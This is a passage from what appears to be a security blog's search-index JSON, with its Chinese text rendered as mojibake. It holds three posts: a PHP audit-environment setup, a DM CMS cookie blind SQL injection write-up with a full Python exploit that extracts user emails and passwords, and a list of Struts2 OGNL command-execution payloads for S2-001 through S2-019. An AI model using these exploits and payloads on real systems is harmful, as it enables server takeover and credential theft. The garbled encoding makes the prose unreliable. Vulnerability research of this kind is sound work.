å¾ˆå®¹æ˜“ï¼Œå°±ä¸æ”¾ä»£ç äº†ï¼‰ æ€»ç»“æ¬ ç¼ºçš„è¿˜æ˜¯å¾ˆå¤šï¼Œç»§ç»­ğŸ’ª"},{"title":"ã€OTHERSã€‘phpä»£ç å®¡è®¡å‰çš„å‡†å¤‡","permalink":"http://blog.0kami.cn/2017/02/03/old-code-review-pre-prepare/","text":"æ¦‚è¿°æ‰€è°“â€œå·¥æ¬²å–„å…¶äº‹,å¿…å…ˆåˆ©å…¶å™¨â€ï¼Œåœ¨ä»£ç å®¡è®¡å‰ï¼Œæˆ‘ä»¬éœ€è¦å‡†å¤‡æé«˜æˆ‘ä»¬å®¡è®¡æ•ˆç‡çš„å·¥å…·ã€‚ ç¯å¢ƒ Mac xampp(å¯ä»¥ç”¨phpstudyæˆ–è€…æ˜¯å…¶ä»–é›†æˆç¯å¢ƒä»£æ›¿) Navicat Premium(ä¸ªäººè®¤ä¸ºMacä¸‹æœ€å¥½çš„æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œå­¦ç”Ÿå…šåªèƒ½ç”¨**,æœ‰èƒ½åŠ›å°½é‡æ”¯æŒæ­£ç‰ˆ) phpstorm(è¿™é‡Œçš„IDEç”¨çš„æ˜¯æˆ‘è‡ªå·±æ¯”è¾ƒä¹ æƒ¯çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ æ¯”è¾ƒç†Ÿæ‚‰çš„) xdebug(ç”¨æ¥åŠ¨æ€è°ƒè¯•) ç»ˆç«¯ æµè§ˆå™¨(firefoxã€chrome,è¿™é‡Œä½¿ç”¨firefox,hackbaræ˜¯ä¸ªå¥½ä¸œè¥¿) å®‰è£…ä¸Šè¿°çš„è½¯ä»¶ä¹‹ç±»çš„å°±ä¸è¯´äº†ï¼Œä¸‹æ–‡ä¸»è¦æ˜¯åŠ¨æ€è°ƒè¯•ç¯å¢ƒæ­å»ºã€‚ åŠ¨æ€è°ƒè¯•ç¯å¢ƒphpæ·»åŠ xdebugé…ç½®xamppçš„php.iniä½äº/install/path/etc/php.iniï¼Œåœ¨é…ç½®æ–‡ä»¶æœ€åæ·»åŠ ä¸Š 1234567891011[xdebug]zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.soxdebug.remote_autostart=onxdebug.remote_enable=onxdebug.remote_enable=1xdebug.remote_mode=&quot;req&quot;xdebug.remote_log=&quot;/var/log/xdebug.log&quot;xdebug.remote_host=localhost/127.0.0.1xdebug.remote_port=9000xdebug.remote_handler=&quot;dbgp&quot;xdebug.idekey=&quot;PhpStorm&quot; soæ–‡ä»¶æ˜¯xamppè‡ªå¸¦çš„ï¼Œmacä¸‹çš„é…ç½®å¯ä»¥ç›´æ¥copyæˆ‘çš„ä¿å­˜åé‡å¯apache firefoxå®‰è£…xdebugæ‰©å±•firefoxä¸‹çš„xdebugæ‰©å±•å« the easiest xdebugï¼Œæœç´¢ä¸€ä¸‹å®‰è£…å®‰è£…å®Œæˆåç‚¹äº®å·¥å…·æ ä¸Šçš„ç”²è™«ï¼Œå¼€å¯è°ƒè¯•è®¾ç½®key,æ›´phpé…ç½®æ–‡ä»¶ä¸­ç›¸åŒ é…ç½®phpstormæ‰“å¼€Preferences-&gt;Languages&amp;Framework-&gt;phpå¦‚å›¾è®¾ç½®serversï¼Œæ¥ç€è®¾ç½®debugä¸‹çš„DBGp Proxyè®¾ç½®å®Œæˆååœ¨å·¥å…·æ å¤„æ‰¾åˆ°edit Configurationsæ–°å¢php web applicationæ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„ä¸‹æ–­ç‚¹ï¼ŒåŠ¨æ€è°ƒè¯•äº† mysqlæ‰§è¡Œå®¡è®¡ç›‘æ§åœ¨navicatæˆ–ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹2å¥ set global general_log=on;set global log_output=â€™tableâ€™; æŸ¥çœ‹mysql.general_logè¡¨å¯ä»¥çœ‹åˆ°è¿è¡Œè¿‡çš„sqlè¯­å¥ï¼Œæ–¹ä¾¿æˆ‘ä»¬æŸ¥è¯¢winä¸‹å¯ä»¥ç”¨seayçš„ä»£ç å®¡è®¡å·¥å…·ï¼Œå¸¦äº†mysqlçš„sqlç›‘æ§ ç»ˆç«¯ç»ˆç«¯ä¸»è¦ç”¨åˆ°äº†grepè¿™ä¸ªå·¥å…·ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šç›¸å…³çš„æ•™æã€‚ä¸»è¦åŒ¹é…è¾“å…¥è¾“å‡ºç‚¹ï¼Œå±é™©å‡½æ•°ç­‰ç­‰å…·ä½“çš„ä»¥åæœ‰ç©ºäº†å†è¡¥å…… æ€»ç»“è®°å½•ä¸€ä¸‹è¿‡ç¨‹ï¼Œä»¥åèƒ½çœ‹çœ‹ï¼Œæ„‰å¿«çš„ä»£ç å®¡è®¡å§:P"},{"title":"ã€Code Reviewã€‘DMä¼ä¸šå»ºç«™ç³»ç»Ÿå‰å°ç›²æ³¨","permalink":"http://blog.0kami.cn/2017/01/29/old-DM-sql-injection/","text":"æ¦‚è¿°ä»Šå¤©æäº†ä¸€ä¸‹åŠ¨æ€è°ƒè¯•çš„ä¸œè¥¿ï¼Œç„¶åé¡ºä¾¿çœ‹äº†çœ‹ä¸Šæ¬¡ä¸‹çš„DMä¼ä¸šå»ºç«™ç³»ç»Ÿ2017.01.23ã€‚ å‰å°cookie æ—¶é—´ç›²æ³¨å¤§è‡´è·Ÿäº†ä¸€ä¸‹å‡ ä¸ªå…¥å£æ–‡ä»¶ï¼Œè¯¥å¥—cmsä¸»è¦çš„å®‰å…¨æªæ–½ä¸ºhtmlentitiesï¼Œåœ¨POST&amp;&amp;GETçš„è¾“å…¥ç‚¹åšäº†htmlå®ä½“åŒ–çš„æ“ä½œï¼Œä½†æ˜¯è¿™å¹¶ä¸è½¬ä¹‰å•å¼•å·ï¼ˆé»˜è®¤ä¸è½¬ä¹‰å•å¼•å·å…·ä½“å¯çœ‹htmlentitiesï¼‰ï¼Œçœ‹äº†ä¸€ä¸‹è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢çš„sqlè¯­å¥ï¼Œæ¶‰åŠåˆ°å­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œéƒ½æ˜¯å•å¼•å·é—­åˆï¼Œé‚£ä¹ˆå¾ˆæ¸…æ¥šï¼Œåœ¨è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢æ—¶å®¹æ˜“äº§ç”Ÿsqlæ³¨å…¥æ¼æ´ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥ä¸»è¦æ‰¾ä¸€ä¸‹è¿›è¡Œæ•°æ®åº“æ“ä½œçš„ä½ç½®ã€‚ POST&amp;&amp;GET COOKIE psï¼šè¿™é‡Œå°±éšä¾¿æ‰¾äº†ä¸€ä¸ªåœ°æ–¹ï¼Œå› ä¸ºè¿™å¥—ç³»ç»Ÿæ³¨å…¥ä¸è¦å¤ªå¤šï¼Œè¿åå°ç™»é™†éƒ½å¯ä»¥ :P å‰é¢æåˆ°å¯¹POST&amp;&amp;GETåšäº†å®ä½“è½¬ä¹‰ï¼Œä½†æ˜¯grepæ‰¾äº†ä¸€ä¸‹cookieï¼Œå‘ç°å¹¶æ²¡æœ‰å¯¹cookieçš„å€¼è¿›è¡Œå®‰å…¨æ“ä½œï¼Œç›´æ¥å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚indexDM_load.php Line 108 12345678910111213...if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) $curstyle = $_COOKIE[&quot;curstyle&quot;];else $curstyle = $row[&apos;curstyle&apos;]; ...$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; //echo $sqlstyle;exit;if(getnum($sqlstyle)&gt;0)&#123; $rowstyle = getrow($sqlstyle); ä¸Šè¿°ä¸ºæ¼æ´çš„ä¸»è¦æˆå› ç‚¹ï¼Œå¦‚æœcookieä¸­å­˜åœ¨curstyle,ä¼˜å…ˆé€‰ç”¨cookieä¸­çš„å€¼ï¼Œç„¶åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ç”±äºæ²¡æœ‰æ‰¾åˆ°å…·ä½“å›æ˜¾æ•°æ®çš„åœ°æ–¹ï¼Œæ‰€ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨çš„æ–¹å¼è·å–æ•°æ®ã€‚ å¸¦ä¸Šè‡ªå·±å†™çš„EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2017/1/30import requests,timeclass CookieBlindSqlInjection: def __init__(self,url): self.url=url self.len=0 def getLength(self,column,table): payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; #first confirm bin-format data length len=0 for i in range(1,9): cookie=payload0.format(column=column,table=table,line_start=0,flag=i) flag=self.send(cookie) if flag==&quot;0&quot;: len=i break res=&quot;&quot; for i in range(1,len+1): cookie=payload1.format(column=column,col_start=i,table=table,line_start=0) flag=self.send(cookie) res+=flag # print res self.len=int(res,2) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len)) return int(res,2) def getData(self,column,table): payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; total_res=&quot;&quot; for i in range(1,self.len+1):#å…·ä½“æ•°æ®çš„é•¿åº¦ len = 0 for j in range(1, 9): cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j) flag = self.send(cookie) if flag == &quot;0&quot;: len = j break # print &quot;len:&quot;+str(len) res = &quot;&quot; for k in range(1, len + 1): cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0) flag = self.send(cookie) res += flag # print res total_res+=chr(int(res,2)) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res) return total_res def send(self,cookie): headers=&#123;&quot;Cookie&quot;:cookie&#125; try: r = requests.get(self.url, headers=headers,timeout=4) return &quot;1&quot; except: return &quot;0&quot;def pprint(flag,content): print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \\ .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)if __name__==&apos;__main__&apos;: cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;) pprint(&quot;*&quot;,&quot;program start&quot;) pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;) cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;) email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;) cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;) ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps) pprint(&quot;*&quot;, &quot;program done&quot;) ps:DMè¿™ä¸ªé¬¼ï¼Œä»£ç å†™çš„å¥½ä¹±å•ŠT_T"},{"title":"ã€VULNERABLITYã€‘Struts2å‘½ä»¤æ‰§è¡Œå„ç‰ˆæœ¬è®°å½•","permalink":"http://blog.0kami.cn/2017/01/13/old-Struts2-history-payload/","text":"æ¦‚è¿°æœ€è¿‘åœ¨å†™Struts2çš„ä¸€äº›PoCï¼Œè®°å½•ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬çš„PoCæ–¹ä¾¿åˆ°æ—¶å€™æŸ¥é˜…ã€‚å…ˆæä¸€ä¸‹å‚è€ƒçš„å‰è¾ˆä»¬çš„ç½‘å€ï¼Œæ„Ÿè°¢ğŸ™ http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html http://www.cnblogs.com/LittleHann/p/4606891.html https://cwiki.apache.org/confluence/display/WW/S2-xxx http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://cwiki.apache.org/confluence/display/WW/S2-009 Struts2å‘½ä»¤æ‰§è¡Œé›†åˆä¸‹æ–‡ä¸æ˜¯å…·ä½“çš„åˆ†ææ–‡ï¼Œèƒ½åŠ›æœ‰é™ï¼Œä»…è®°å½•ä¸€ä¸‹ä»¥åšå°†æ¥å¤ä¹ æŸ¥ç”¨ã€‚è¿‡æ®µæ—¶é—´ä¼šå°†æ‰€æœ‰çš„æ¼æ´ç¯å¢ƒä¸Šä¼ åˆ°githubä¸Šï¼Œç¯å¢ƒæ¥æºå¤§éƒ¨åˆ†ä¸ºæˆ‘å¶åƒrickgrayåšå®¢ä¸Šå…±äº«çš„ä»¥åŠå®˜ç½‘ä¸Šä¸‹çš„å¯¹åº”ç‰ˆæœ¬çš„ç¤ºä¾‹ç¯å¢ƒã€‚update:2017/1/16 ç¯å¢ƒåœ°å€ Struts2 S2-001å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.0.8 å…·ä½“è¯¦æƒ…ï¼šhttps://struts.apache.org/docs/s2-001.html è¯¥æ¼æ´å› ä¸ºç”¨æˆ·æäº¤è¡¨å•æ•°æ®å¹¶ä¸”éªŒè¯å¤±è´¥æ—¶ï¼Œåç«¯ä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨ OGNL è¡¨è¾¾å¼ %{value} è¿›è¡Œè§£æï¼Œç„¶åé‡æ–°å¡«å……åˆ°å¯¹åº”çš„è¡¨å•æ•°æ®ä¸­ã€‚ä¾‹å¦‚æ³¨å†Œæˆ–ç™»å½•é¡µé¢ï¼Œæäº¤å¤±è´¥åç«¯ä¸€èˆ¬ä¼šé»˜è®¤è¿”å›ä¹‹å‰æäº¤çš„æ•°æ®ï¼Œç”±äºåç«¯ä½¿ç”¨ %{value} å¯¹æäº¤çš„æ•°æ®æ‰§è¡Œäº†ä¸€æ¬¡ OGNL è¡¨è¾¾å¼è§£æï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€  Payload è¿›è¡Œå‘½ä»¤æ‰§è¡Œ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–tomcatæ‰§è¡Œè·¯å¾„1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; è·å–webæ ¹ç›®å½•1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125; Struts2 S2-005å½±å“ç‰ˆæœ¬: 2.0.0 - 2.1.8.1 æ¼æ´è¯¦æƒ…: http://struts.apache.org/docs/s2-005.html struts2æ¼æ´çš„èµ·æºæºäºS2-003(å—å½±å“ç‰ˆæœ¬: ä½äºStruts 2.0.12)ï¼Œstruts2ä¼šå°†httpçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºonglè¯­å¥æ‰§è¡Œ(å¯ç†è§£ä¸ºjavaä»£ç )ã€‚onglè¡¨è¾¾å¼é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼Œstrutsæ¡†æ¶é€šè¿‡è¿‡æ»¤#å­—ç¬¦é˜²æ­¢å®‰å…¨é—®é¢˜ï¼Œç„¶è€Œé€šè¿‡unicodeç¼–ç (\\u0023)æˆ–8è¿›åˆ¶(\\43)å³ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œå¯¹äºS2-003æ¼æ´ï¼Œå®˜æ–¹é€šè¿‡å¢åŠ å®‰å…¨é…ç½®(ç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œç­‰)æ¥ä¿®è¡¥ï¼Œä½†æ˜¯å®‰å…¨é…ç½®è¢«ç»•è¿‡å†æ¬¡å¯¼è‡´äº†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨OGNLè¡¨è¾¾å¼è®²è¿™2ä¸ªé€‰é¡¹æ‰“å¼€ï¼ŒS2-003çš„ä¿®è¡¥æ–¹æ¡ˆæŠŠè‡ªå·±ä¸Šäº†ä¸€ä¸ªé”ï¼Œä½†æ˜¯æŠŠé”é’¥åŒ™ç»™æ’åœ¨äº†é”å¤´ä¸Š ä¸Šæ–‡å¼•ç”¨LittleHannçš„æè¿° æ„é€ PoCè·å–webæ ¹ç›®å½•1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))&apos;)(d))&amp;(i99)((&apos;\\43xman.getWriter().close()&apos;)(d)) æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43mycmd\\75\\&apos;&quot;+cmd+&quot;\\&apos;&apos;)(d))&amp;(h)((&apos;\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)&apos;)(d))&amp;(i)((&apos;\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\\43myres\\75new\\40byte[51020]&apos;)(d))&amp;(k)((&apos;\\43mydat.readFully(\\43myres)&apos;)(d))&amp;(l)((&apos;\\43mystr\\75new\\40java.lang.String(\\43myres)&apos;)(d))&amp;(m)((&apos;\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\\43myout.getWriter().println(\\43mystr)&apos;)(d)) ä¸Šé¢2ä¸ªPoCæ‘˜è‡ªk8teamï¼Œä¸ºäº†å†™PoCï¼Œæœ‰æ‰€æ”¹åŠ¨ï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸è´´ä¸Šæ¥äº†ï¼šï¼‰ Struts2 S2-009å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.1.1 æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-009.html æ¼æ´åˆ©ç”¨ç‚¹è·ŸS2-003å’ŒS2-005ç±»ä¼¼ï¼Œåˆ©ç”¨OGNLè¡¨è¾¾å¼(1)(2),ä¼šæ‰§è¡Œ1çš„OGNLè¡¨è¾¾å¼ï¼Œ009æ„é€ äº†çš„æ–¹æ³•ä¸ºtest=(some OGNL è¡¨è¾¾å¼)(1)&amp;z[(test)(1)]=trueã€‚z[(test)(1)]=true,å¯¹struts2æ¥è¯´æ˜¯åˆæ³•çš„å‚æ•°ï¼Œä½†æ˜¯(test)(1)ä¼šæ‰§è¡Œä¸Šè¿°è¯´çš„æ–¹æ³•ï¼Œtestçš„å€¼è¢«å¸¦å…¥è®¡ç®—ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚ æ„é€ PoCå¼¹è®¡ç®—å™¨ps:å®éªŒç¯å¢ƒè¯•äº†å¥½å‡ æ¬¡éƒ½ä¸èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè·¯è¿‡çš„å¤§ä½¬æ±‚æŒ‡æ•™ï¼šï¼‰ 1person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true ç”¨çš„æ˜¯person/new-person.actionè¿™ä¸ªæ§åˆ¶å™¨ è·å–webæ ¹ç›®å½•1person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot; Struts2 S2-012å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.13 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-012 Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ ${param_name} ä½œä¸ºé‡å®šå‘å˜é‡,strutsåœ¨è·å–å…¶å€¼æ—¶ä¼šæ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œ æ„é€ PoCè·å–webæ ¹è·¯å¾„1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A Struts2 S2-013/S2-014å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.14.1 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014 æ ‡ç­¾s:urlå’Œs:aä¸­æä¾›includeå‚æ•°ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ä¸º none - include no parameters in the URL (default) get - include only GET parameters in the URL all - include both GET and POST parameters in the URL å¦‚æœå‚æ•°å€¼ä¸ºgetæˆ–allï¼Œåœ¨è·å–å¯¹åº”çš„å‚æ•°å€¼æ—¶æ‰§è¡Œäº†OGNLè¡¨è¾¾å¼ æ„é€ PoCè·å–webæ ¹ç›®å½•1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125; Struts2 S2-016å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15 æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-016.html DefaultActionMapper ç±»æ”¯æŒä»¥ action:ï¼Œredirect: å’Œ redirectAction: ä½œä¸ºè®¿é—®å‰ç¼€ï¼Œå‰ç¼€åé¢å¯ä»¥è·Ÿ OGNL è¡¨è¾¾å¼ï¼Œç”±äº Struts2 æœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä»»æ„ Action å¯ä»¥ä½¿ç”¨è¿™äº›å‰ç¼€æ‰§è¡Œä»»æ„ OGNL è¡¨è¾¾å¼ï¼Œä»è€Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–webæ ¹ç›®å½•1?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos; è¿˜æœ‰ä¸€ç§æ¯”è¾ƒéšè”½çš„æ–¹æ³•ï¼Œå°†PoCæ”¾åœ¨æ–‡ä»¶ä¸Šä¼ çš„nameå¤„ï¼Œè¿‡wafã€‚ Struts2 S2-019å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15.1 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-019 è¯¥æ¼æ´æˆå› ä¸ºå¼€å¯äº†å¼€å‘è€…æ¨¡å¼ï¼Œä¼ å…¥debug=command&amp;expression=å¯¼è‡´æ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ æ„é€ PoCè·å–webæ ¹è·¯å¾„1debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29 